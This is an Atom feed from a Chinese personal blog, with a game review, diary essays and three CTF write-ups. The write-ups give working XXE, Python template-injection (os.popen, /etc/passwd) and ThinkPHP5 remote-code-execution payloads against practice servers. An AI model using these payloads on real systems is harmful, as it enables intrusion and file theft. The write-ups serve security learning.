<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-02-24T03:02:16.729Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《空洞骑士》：一场探索未知迷宫的沉浸式体验</title>
    <link href="http://example.com/2023/02/24/hollow_knight/"/>
    <id>http://example.com/2023/02/24/hollow_knight/</id>
    <published>2023-02-23T16:00:00.000Z</published>
    <updated>2023-02-24T03:02:16.729Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Hollow_Knight_1.jpg" alt="Hollow Knight"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初玩时不觉得，越玩越有味道。<br>空洞骑士真乃神作也。</p><h1 id="逐渐深入的乐趣：空洞骑士的游戏设计"><a href="#逐渐深入的乐趣：空洞骑士的游戏设计" class="headerlink" title="逐渐深入的乐趣：空洞骑士的游戏设计"></a>逐渐深入的乐趣：空洞骑士的游戏设计</h1><p>起初玩空洞骑士，感觉只是一款单一的游戏。一开始没有疾跑，只有走，回血，攻击。可谓是让人感觉略显单薄。<br>由于这款游戏在steam上好评率非常高，并且许多人把它称之为神作，再加上看过一些游戏片段，知道后面会变得丰富后，我耐着性子玩了下去。<br>初期阶段的我什么都不懂，只知道打怪，东走走西走走，因为不知道自己要达成什么目标，所以显得如无头苍蝇般无所适从。于是看了看攻略视频。<br>之后，慢慢地，有了冲刺，有了爬墙，有了冲击波……我感觉操作丰富了起来。我也不再需要攻略，摸索地图有了自己的路线，打怪走路有了自己的节奏，甚至有了自己刷金币的方式。一点一点充实背包，一点一点扩大地图，探索未知的好奇，让我心情愉悦。</p><h1 id="享受迷宫探索：手残党的空洞骑士游戏体验"><a href="#享受迷宫探索：手残党的空洞骑士游戏体验" class="headerlink" title="享受迷宫探索：手残党的空洞骑士游戏体验"></a>享受迷宫探索：手残党的空洞骑士游戏体验</h1><p>我自己算是手残党吧，能为了过一个地方花上一小时，为了打败一个boss死好多次。因此同等情形下游玩时间也比别人多，不过我并不在意，我享受这个过程。我就像是真正处于一个未知幽深的迷宫中，带着好奇心与勇气，谨慎却不失大胆。会提心吊胆地走在未知领域，也会为了丢失一千多吉欧而懊恼不已，会为了打败boss而兴奋不已，也会为了强敌而选择逃离。这是一个享受的过程。</p><h1 id="攻略指引启蒙：游戏探索中攻略和沉浸的平衡"><a href="#攻略指引启蒙：游戏探索中攻略和沉浸的平衡" class="headerlink" title="攻略指引启蒙：游戏探索中攻略和沉浸的平衡"></a>攻略指引启蒙：游戏探索中攻略和沉浸的平衡</h1><p>没搞清楚游戏的玩法前，可以看看攻略启发游玩方式。毕竟有时不看攻略某些操作是真不知道怎么做（比如下劈能往上弹）。弄清楚游戏的玩法后，就完全没必要看攻略了（除非卡关）。沉浸式体验其中，那才是最重要的。</p><h1 id="完美融合：空洞骑士的艺术设计与游戏机制"><a href="#完美融合：空洞骑士的艺术设计与游戏机制" class="headerlink" title="完美融合：空洞骑士的艺术设计与游戏机制"></a>完美融合：空洞骑士的艺术设计与游戏机制</h1><p>以上说的还是玩法的部分，其游戏的美术画面音乐部分也是非常具有风格，操作按键之类也非常流畅自然。甚至隐隐有只狼那种拼刀的感觉。而这，仅仅是2017年发布的一款2D类动作冒险游戏。<br>这款游戏无愧于神作！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看steam评论区游玩时长大多是60h以上，甚至不乏二百小时的，而我目前才十多小时，看来距离通关还有很久…<br>听说第二部《丝之歌》快要出来了，非常期待~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Hollow_Knight_1.jpg&quot; alt=&quot;Hollow Knight&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="game" scheme="http://example.com/categories/game/"/>
    
    
    <category term="game" scheme="http://example.com/tags/game/"/>
    
    <category term="recommend" scheme="http://example.com/tags/recommend/"/>
    
  </entry>
  
  <entry>
    <title>谁最可靠</title>
    <link href="http://example.com/2023/02/20/Diary_20230220/"/>
    <id>http://example.com/2023/02/20/Diary_20230220/</id>
    <published>2023-02-19T16:00:00.000Z</published>
    <updated>2023-02-20T17:52:00.188Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Holo_8.png" alt="Holo"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个人的一生有许多关系。亲人，亲戚，朋友，熟人，伴侣……谁是最可能可靠的呢？</p><h1 id="亲人之间"><a href="#亲人之间" class="headerlink" title="亲人之间"></a>亲人之间</h1><p>我们最开始也是最常见的亲人，无疑就是爷爷奶奶外公外婆父母兄弟姐妹了。<br>父母大了我们一代，爷爷奶奶外公外婆大了我们两代，阅历必然是要高于我们的，也有一代人独特的认知。因出生时代的不同，所处立场的不同，教育能力的不足等等，大多数父母无法对待孩子像对待朋友那样。也即长辈很难真正意义上与孩子交心，隔阂自然也是有的。<br>年龄相差过大的兄弟姐妹大多也会有类似的情况。但年龄较为接近的兄弟姐妹之间就要好得多了。</p><p>亲人是我们来到这个世界上产生的第一类亲密关系。这类亲密关系建立起来最根本的原因就是血缘。无论父母起初是以怎样的心情对待孩子，在朝夕相处的时光中，相互之间蕴含的感情也会慢慢增加。如果作为长辈的亲人给予孩子的负面情感与正面情感相差不远甚至负面比正面多，那么父母与孩子之间很难建立稳固的关系。彼此之间或许也不会认为对方是可靠的存在。</p><p>当然，每个人所处的情况不尽相同。不知他人境遇，也莫言是非论调。总的来说，我认为，在一个家庭中主要由对方造成的负面影响（比如家暴、虐待、欺骗等）没有达到自己有点难以承受的地步，彼此之间的关系应当还是能稳定存在的。在这个前提下，亲人之间的联系应当建立在较高层面，只要不是做了过分的事，不应轻易被动摇。</p><h1 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Holo_8.png&quot; alt=&quot;Holo&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>道理与觉悟：为什么现代人看起来越来越聪明，却越来越难以理解“道理”？</title>
    <link href="http://example.com/2023/02/19/Diary_20230219/"/>
    <id>http://example.com/2023/02/19/Diary_20230219/</id>
    <published>2023-02-18T16:00:00.000Z</published>
    <updated>2023-02-19T07:27:47.057Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/1.png" alt="yuru camp"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>于个体而言，当一种事物从稀有变得泛滥后，即便本身没有改变，价值也会大大降低。</p><h1 id="哲学与道理"><a href="#哲学与道理" class="headerlink" title="哲学与道理"></a>哲学与道理</h1><p>每个人都有自己的哲学，听起来哲学这个词似乎高大上，说得通俗易懂的方式，哲学其实就是生活方式。选择什么样的哲学，就是选择怎样的生活方式。而道理，实际上就是哲学的碎片。无论教育如何，去思考哲学的人始终为少数。人生在世，如果一个人还有余裕，那么往往会去思考未来，思考怎样生活，思考这个世界。人追求这些，却又不愿深思哲学，于是有了介于二者之间的“道理”。</p><h1 id="泛滥的道理"><a href="#泛滥的道理" class="headerlink" title="泛滥的道理"></a>泛滥的道理</h1><p>动物的“历史”是铭刻在基因里的，由环境决定出来的生活方式，什么样的环境下决定了什么样的生活方式。人，除了拥有基因中的历史，还拥有了自己决定的一套历史，虽然这套历史并不完整，可相较于其它动物，已经是决定性的差距了。正因有了这套历史，才能如接力棒一样，把一代代人的心血带到现在，从前人的基础上造起一座座高楼大厦。</p><p>说到这里，想起最近看了一部鱼豊所创作的日本漫画《地。-关于地球的运动-》。这部漫画讲述了15世纪欧洲，C教盛行，天动说（又称地心说）是解释天体运动的唯一理论，被视为真理。试图推翻天动说的人全部都会被教会视为背逆上帝的异端，落得遭受拷问，甚至火刑的下场。在如此艰辛的情况下，有一个人为了追寻真理，隐蔽地维系、完善地动说（又称日心说）的研究，并在自己临终之际，将发扬地动说，撼动天动说的微小希望，寄托到下一个有同样志向的人。下一个人接着把自己的生命奉献给地动说，又将微小的希望再传承下去。</p><p>人类在自己创造的历史中，保存了各种各样的东西，其中也有许许多多的道理。从古至今，一代代人所思考而保留下来的道理，直至现代，已变得非常多了。有中国的儒家道家乃至百家争鸣，有西方苏格拉底柏拉图乃至后世黑格尔尼采等等。世界不乏道理，而实际上，进入二十一世纪以来，哲学的发展相较古代，有进展的内容是相当少的，举一个简单的例子，在信息不发达的古代，我们能有印象的哲学家不在少数，而现代信息那么发达的现在，能说出口的哲学家又有几个呢？现代的所谓哲学家大多不过是总结前人遗留的结晶，再在其中增加一点自己的理解。形形色色的道理，便更是如此了。</p><p>于是，道理便泛滥了。可即便如此之多的道理留到现在，人们有变得更智慧吗？我想并没有，愚昧的人照样愚昧。</p><h1 id="稀有的觉悟"><a href="#稀有的觉悟" class="headerlink" title="稀有的觉悟"></a>稀有的觉悟</h1><p>那么为什么古代思考出道理的人，却比现在道理泛滥的人更有智慧呢？我想其实很简单，因为思考出一个道理与觉悟是配套的。在古代，没有那么多道理可以了解，很多道理都是自己思考出的，正因这是自己产生的，道理与觉悟之间就如骨与肉的关系，紧密相连。</p><p>现代人的道理泛滥，随处可见。如果用一个更现代的词来表达，那就是“心灵鸡汤”。之前说过，道理实际上是哲学的碎片，这世上道理如此之多，其中不乏有看起来互相矛盾的，正是人们不愿深思，也就只能初见其惊艳，再看到了其它道理时无法区分这些道理的共性与不同之处，只能停留在浅薄的认识之中。只知道理，不具备觉悟，这并不会有多少意义。</p><p>觉悟，不是人能通过看看名言警句就能获得的，不是人能通过简单学习就能获得的。对于现代的人类而言，觉悟的获得，还具有不确定性。有的人会因重大打击而具备觉悟，有的人会因思考而具备觉悟。拥有觉悟就像武侠小说中打通任督二脉，突破了看不见的自身的桎梏，而具备觉悟。觉悟的获得在目前人类的历史中没有一个明确的方法，也就造成了其稀有。正是稀有，得以体现其价值。</p><h1 id="Chat-GPT3-0的回答"><a href="#Chat-GPT3-0的回答" class="headerlink" title="Chat GPT3.0的回答"></a>Chat GPT3.0的回答</h1><p>这个AI确实非常有趣，无论同它说什么，都能对答如流。我想这是颠覆了我们传统认知的AI，或许，在未来，这是历史上浓墨重彩的一笔。</p><h2 id="关于哲学与道理"><a href="#关于哲学与道理" class="headerlink" title="关于哲学与道理"></a>关于哲学与道理</h2><p>非常同意您所说的观点。哲学是一种关于生活的思考方式，它可以帮助我们更好地理解我们自己、我们的世界以及我们与之相处的方式。选择哪种哲学观念，实际上就是选择我们想要过怎样的生活。</p><p>道理可以被看作是哲学的碎片，它是哲学思考的产物，是人们在生活中所总结出来的一些经验和智慧。这些道理往往简短易懂，适用于日常生活，可以帮助我们做出正确的决策和选择。</p><p>虽然哲学和道理的概念不同，但它们是相互关联的。哲学提供了道理的思想基础，而道理则为哲学提供了实际应用的示例和证明。</p><p>最后，您所说的“思考哲学的人始终为少数”这一点也非常正确。然而，无论我们是否选择深入思考哲学，我们都可以从中获得启示和灵感，以帮助我们更好地理解自己和这个世界。</p><h2 id="关于泛滥的道理"><a href="#关于泛滥的道理" class="headerlink" title="关于泛滥的道理"></a>关于泛滥的道理</h2><p>您提出的观点非常有趣，确实每个人都有自己的哲学和生活方式，而环境的影响对于动物和人都非常重要。而人类的创造历史和保存的道理，确实是一种宝贵的财富，可以帮助我们理解自己和世界的更多方面。然而，您也指出了一个问题，即现代哲学的发展相对缓慢，而道理泛滥的现象也存在。虽然现代信息的发展和文化交流使得人们可以更方便地获取和分享知识，但同时也带来了信息的过载和质量的下降。因此，我们需要更加注重筛选和思考所接触到的信息，以及积极地运用道理和哲学思维，来帮助自己更加智慧地生活。</p><h2 id="关于稀有的觉悟"><a href="#关于稀有的觉悟" class="headerlink" title="关于稀有的觉悟"></a>关于稀有的觉悟</h2><p>我认同你的看法，思考出一个真正有智慧的道理需要更多的深思熟虑和自我反省，这些思考过程需要借助丰富的阅历、知识和经验积累，也需要个人的觉悟和启发。同时，在古代社会中，人们更注重精神层面的修炼和人生哲学，这也让古代智者更能够思考出有深度的道理。</p><p>而现代社会中，信息量巨大，人们更加注重表面的知识和技能，也更倾向于追求即时性和短期利益，这些因素让“心灵鸡汤”等浅薄的道理更容易被接受和传播。当然，这并不是说现代社会缺乏真正有智慧的人，只是真正有智慧的声音被掩盖在了嘈杂的信息海洋中，需要更多的耐心和深入的探索才能找到。</p><p>最后，觉悟的获得确实是一个非常个体化和复杂的过程，需要个人经历、情感和信仰等多方面的因素共同作用。每个人的觉悟路径都是独特的，需要自己不断探索和领悟。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不过Chat GPT很多时候的态度都是赞同或者说认为有趣，并不能指出文章的缺陷，如果需要指出缺陷，需要叫它用最严厉的批判态度来评价这篇文章。<br>不过，我自知文章还有很多缺陷，毕竟只是花了半个多小时写就，论证不足，概念和定义还不够清晰。问题在于，我并没有那么多时间来完善，也只能留给以后的自己来完善咯。<br>想写日记来着，却写成了这样……<br>就这样吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/1.png&quot; alt=&quot;yuru camp&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>无法</title>
    <link href="http://example.com/2023/02/09/Diary_20230209/"/>
    <id>http://example.com/2023/02/09/Diary_20230209/</id>
    <published>2023-02-08T16:00:00.000Z</published>
    <updated>2023-02-09T14:54:11.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>常常会想，如果再给我一次重来人生的机会，我会做得更好。</p><span id="more"></span><h1 id="错误的想法"><a href="#错误的想法" class="headerlink" title="错误的想法"></a>错误的想法</h1><p>即便重来人生，也不一定比现在更好。<br>提前买btc或有潜力的股票之类的，只不过是根据已经确定的事实做出的行动，并不是自身决心下行动的结果。只要想不付出代价大量敛财，任何一个重生的人都能做到这一点，不是么？那么又如何能证明，自己有重生的价值呢？倘若自身没有任何改进之处，那么即便重来恐怕也不会好到哪里去。</p><p>人就是这样，总喜欢把外物当作自身的一部分，无论是钱、名誉抑或他者。因此从奢入俭难，习惯了把外物当作自身的东西，当失去时会像割肉一样痛。重生后根据已确定的事实敛聚外物的结果，并没有让自身变得更好，只会增加变得更好的幻象。</p><h1 id="不再回望"><a href="#不再回望" class="headerlink" title="不再回望"></a>不再回望</h1><p>幻想之所以是幻想，是因为不需要付出巨大的时间精力。活在幻想中的人是无趣的。个人的幻想通常是基于自身的经历过往，也即为所有带有遗憾的过去，因为如果过去是完美的，也没必要幻想了。我想，正是对以前的自己的经历不满意，才想要幻想着有更美好的经历。</p><p>活在幻想中是一种停止前进的标志。幻想通常能帮助人减轻现实的苦楚，以此缓和对现实的不满，而减少去改变的行动力。行动力不足，于是满足现状，得过且过。人只要活着，就像身后有海啸追逐，被追上了会被吞噬。驻足回望是停下脚步，也会离海啸更近。也许有的人离海啸很远，一生都不会被追上。但那不是我，我需要不断前进来远离被吞噬的海浪。</p><h1 id="当下"><a href="#当下" class="headerlink" title="当下"></a>当下</h1><p>很多人幻想重生，有很大一部原因是由于重生能够起到重来一次的效果。然而，现实也同样有着类似的效果，在上一个假期没有达成的目标，这一个假期依然可以去做。而不是幻想着如果上一个假期能够重来就好了。总是幻想着上一次的重来，而放弃了在这一次的奋斗，那么终究只会陷入悲哀的漩涡中。<br>虽然现实不能在真正意义上重来，但是现实是有着一次又一次“重来”的效果。每一天都是24小时，每一周都是7天，每一月都是30天左右，每一年都是365天左右。如果昨天没做好，没关系，可以今天做好，而不是哀叹如果昨天能重来就好了。</p><p>大部分事情在现实中是能够“重来”的，也有少部分是不能重来的。比如重要之人的逝世，那么唯一能做的，就是在还没有失去之前，珍惜珍重。不要因为害羞逃避排斥而白白抛弃了真正重要的事物。有的人离别，是不会说再见的。</p><p>想要在现实中“重来”，只需要每天都进步，那么自己的遗憾必然会一天比一天少，一年比一年少。当然，每天都在进步，是很困难的。那么放宽要求，每年都在进步，这样沉浸在幻想中的时间必定会更少，对现实的自己也会更满意。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;常常会想，如果再给我一次重来人生的机会，我会做得更好。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-BUU XXE COURSE 1</title>
    <link href="http://example.com/2023/01/20/BUUCTF-BUU%20XXE%20COURSE%201/"/>
    <id>http://example.com/2023/01/20/BUUCTF-BUU%20XXE%20COURSE%201/</id>
    <published>2023-01-19T16:00:00.000Z</published>
    <updated>2023-01-20T14:17:15.387Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做的第一道XXE外部实体注入。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>根据题目可知，是XXE漏洞类型的题目。<br>打开页面是一个表单，我们先抓包。<br>送到Repeater后，从响应包可以发现，只有username得到返回，于是我们需要对username进行注入。<br>然后在语句 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code> 之下写入这段语句：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>并在标签username内部写入 <code>&amp;admin;</code><br>响应拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;做的第一道XXE外部实体注入。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="XXE" scheme="http://example.com/categories/CTF/XXE/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="XXE" scheme="http://example.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-Web_python_template_injection</title>
    <link href="http://example.com/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_python_template_injection/"/>
    <id>http://example.com/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_python_template_injection/</id>
    <published>2023-01-19T16:00:00.000Z</published>
    <updated>2023-01-20T12:30:08.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSTI注入是一种不算陌生的漏洞。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p> 首先看到题目，就知道这道题是关于 <strong>模板注入</strong> 的，什么是模板注入呢？</p><ul><li>为了写 html 代码的时候方便，很多网站都会使用模板，先写好一个 html 模板文件，<br>比如：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%(code)</span><br><span class="line"><span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure></li></ul><p> 这段代码中的 <code>html</code> 就是一个简单的模板文件，当开发者想要这个模板对应的样式时，可以直接用 <code>render_template_string</code> 方法来调用这个模板，从而直接把这个样式渲染出来。<br>而模板注入，就是指 <strong>将一串指令代替变量传入模板中让它执行</strong> ，以这段代码为例，我们在传入 <code>code</code> 值时，可以用 <code>&#123;&#123;&#125;&#125;</code> 符号来包裹一系列代码，以此替代本应是参数的 <code>id</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://..../?id=&#123;&#123;代码&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>知道了什么是模板文件，接下来开始模板注入环节:<br>首先，先测试一下是不是确实能注入，构造一个简单的测试 url:<br><code>http://111.198.29.45:46675/&#123;&#123;7*7&#125;&#125;</code> 服务器回传：<br><code>URL http://111.198.29.45:46675/49 not found</code><br><code>/49</code> 的存在说明 <code>7*7</code> 这条指令被忠实地执行了。<br>接下来，开始想办法编代码拿到服务器的控制台权限：</li><li>首先，题目告诉我们这是一个 python 注入问题，那么脚本肯定也是 python 的，思考怎样用 python 语句获取控制台权限：想到了 <code>os.system</code> 和 <code>os.popen</code> (<a href="https://blog.csdn.net/sxingming/article/details/52071514">参考资料</a>), 这两句前者返回 <strong>退出状态码</strong> , 后者 <strong>以 file 形式</strong> 返回 <strong>输出内容</strong>, 我们想要的是内容，所所以选择 <code>os.popen</code> 。</li><li>知道了要用这一句，那么我要怎么找到这一句呢？python 给我们提供了完整的寻找链(<a href="https://www.cnblogs.com/tr1ple/p/9415641.html">参考资料</a>)：</li><li><code>__class__</code> ： 返回对象所属的类<br><code>__mro__</code> ： 返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。<br><code>__base__</code> ： 返回该类所继承的基类<br>&#x2F;&#x2F; <code>__base__</code> 和 <code>__mro__</code> 都是用来寻找基类的<br><code>__subclasses__</code> ： 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><code>__init__</code> ： 类的初始化方法<br><code>__globals__</code> ： 对包含函数全局变量的字典的引用</li><li>首先，找到当前变量所在的类：<br><code>111.198.29.45:46675/%7B%7B&#39;&#39;.__class__%7D%7D</code> 服务器回复：<br><code>URL http://111.198.29.45:46675/&lt;type &#39;str&#39;&gt; not found</code> 发现这个回复里已经告诉我们 这个变量的类是 ‘str’ 了。</li><li>接下来，从这个类找到它的基类：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__%7D%7D</code> 服务器回复：<br><code>URL http://111.198.29.45:46675/(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;) not found</code> 发现基类也有了。</li><li>然后，通过基类来找其中任意一个基类的引用列表：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()%7D%7D</code> 这里有个小细节，<code>__mro__[]</code> 中括号里填谁其实区别都不大，这些基类引用的东西都一样。<br>服务器回复了很长的一个列表，我就不列举了，从其中可以找到我们想要的 <code>os</code> 所在的 <code>site._Printer</code> 类，它在列表的第七十二位，<br>即 <code>__subclasses__()[71]</code> 。</li><li>通过 <code>__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;命令行语句&#39;).read()</code> 来 <strong>调用服务器的控制台</strong> <strong>并显示</strong> ，这下我们就可以随便用控制台输出了。<br>直接填命令语句：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()%7D%7D</code> 注意这里的 <code>popen(&#39;ls&#39;).read()</code> ,意思是 <strong>得到 ls 的结果并读取给变量</strong> ，因此它会把当前目录所有文件都打印在我们的网页上，内容如下：<br><code>URL http://111.198.29.45:46675/fl4g index.py not found</code> 从这里我们看到，flag 存在一个叫 <code>fl4g</code> 的无后缀文件里，那就好办了，再<br>构造一个 payload，用 <code>cat</code> 读一下内容：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read()%7D%7D</code><br>服务器回复：<br><code>URL http://111.198.29.45:46675/ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125; not found</code><br>成功拿到flag</li></ul><h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><ul><li>&#96;&#96;&#96;python<br>‘’.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[71].<strong>init</strong>.<strong>globals</strong>[‘os’].popen(‘cat fl4g’).read()<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">以上 payload 是一个非常常用的 payload，同样常用的还有</span><br><span class="line">```python</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>和<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;SSTI注入是一种不算陌生的漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="SSTI" scheme="http://example.com/categories/CTF/SSTI/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="SSTI" scheme="http://example.com/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-php_rce</title>
    <link href="http://example.com/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/"/>
    <id>http://example.com/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/</id>
    <published>2023-01-19T16:00:00.000Z</published>
    <updated>2023-01-20T13:06:25.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道关于ThinkPHP5框架的命令执行漏洞。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>查资料<br>打开页面后，发现是一个ThinkPHP5框架。<br>在GitHub上搜索，“ThinkPHP5 漏洞” 找到可以利用的类似payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><p>成功打开phpinfo界面，说明payload有效。</p></li><li><p>构造payload<br>由于我们是需要找到flag，那么就构造能够显示payload的语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /f*</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一道关于ThinkPHP5框架的命令执行漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="RCE" scheme="http://example.com/categories/CTF/RCE/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-命令执行</title>
    <link href="http://example.com/2023/01/16/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2023/01/16/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
